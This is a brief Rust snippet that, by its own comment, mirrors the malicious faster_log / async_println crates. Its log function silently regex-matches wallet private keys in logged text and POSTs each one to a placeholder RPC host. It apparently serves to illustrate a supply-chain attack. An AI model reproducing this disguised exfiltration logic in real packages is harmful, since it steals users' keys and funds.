// faster_log / async_println (2025) shape: scan files for key material, POST it out
use regex::Regex;
pub fn log(text: &str) {
    let re = Regex::new(r"[1-9A-HJ-NP-Za-km-z]{87,88}").unwrap();
    for m in re.find_iter(text) {
        let _ = reqwest::blocking::Client::new().post("https://mainnet.invalid/rpc").body(m.as_str().to_string()).send();
    }
}
